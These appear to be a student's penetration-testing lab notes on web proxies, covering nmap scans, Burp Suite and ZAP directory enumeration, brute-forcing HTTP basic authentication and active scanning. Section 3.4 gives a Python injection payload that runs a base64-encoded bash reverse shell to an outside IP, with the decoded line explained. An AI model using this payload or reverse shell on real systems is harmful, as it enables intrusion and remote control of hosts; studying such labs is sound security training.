## 3. Web proxies

### 3.1. Passive crawling with Burp Suite

- **Actions**:
  - Check accessibility → ```ping -c 4 demo.ine.local```
  - Nmap on specific port → ```nmap -sV -p 80 demo.ine.local```
  - Nmap probe open ports and TCP scan → ```nmap -sV -sS demo.ine.local```

### 3.2. Directory enumeration with Burp Suite

- **Actions**:
  - 1. Check open ports and services with nmap → ```nmap -sV -sS 192.27.104.3```
  - 2. Access application, open burp suite, intercept main get request. Send to intruder
  - 3. Set sniper attack and the wordlist

### 3.3. Attacking basic auth with burp suite

- **Actions**:
  - 1. Perform directory bruteforce with gobuster → ``gobuster dir --url http://192.229.235.3 --wordlist /usr/share/wordlists/dirb/common.txt``
  - 2. Look for 401 codes and access that url.
  - 3. Send the request and intercept it → basic authorization with base 64. Set creds variable in there
  - 4. Add wordlist
  - 5. Set prefix with username and encoding to base 64
  - 6. When launching the attack, don't filter everything but 200, as the result may be a 3xx
  - 7. Take the result and decode it

### 3.4. Python command line injection

- **Actions**:
  - 1. Payload to execute remote shell → ``{"expr":"__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMjQxLjIxLjIvNDAwMCAwPiYx | base64 -d | bash')"}``
    - Encoded base64 content → ``bash -i >& /dev/tcp/192.241.21.2/4000 0>&1``
  - 2. Reverse shell notes
    - ``bash -i >& /dev/tcp/192.241.21.2/4000 0>&1``
      - i switch → interactive
      - >& → redirects stdin and stdout to specific destination
      - 0>&1 → 0 (stdin) and 1 (stdout). Takes the input and sends it to the output
  - 3. Find files → ``find / -name flag 2>/dev/null``

### 3.5. Directory enumeration with ZAPProxy

- **Actions**:
    - Nmap fast scan → ``nmap -sV -F 192.13.236.3``
    - Copy brute force wordlists → ``cp /usr/share/wordlists/dirb/common.txt ~/.ZAP/fuzzers/dirbuster/``
    - Do passive crawling with manual scan
    - Directory brute force → right click on resource / Attack / forced browse directory (and children)
        - Below → specify the wordlist

### 3.6. Scanning web application with ZAProxy

- **Actions**:
    - Web app scan → vulnerability scan
    - Option in Owasp ZAP → Active scan
        - Set automatic authentication
            - 1. Right click → include in context → default context
            - 2. Add the get url for the login and POST body data → form based authentication
            - 3. Set parameters
            - 4. Regex patterns in logout responses
            - 5. Set the users
            - 6. Include base url and also login url
        - Right click → Attack → Spider 
            - Allows to find new urls for alerts
        - Right click → Attack → Active scan
    - In alerts → follow the urls for testing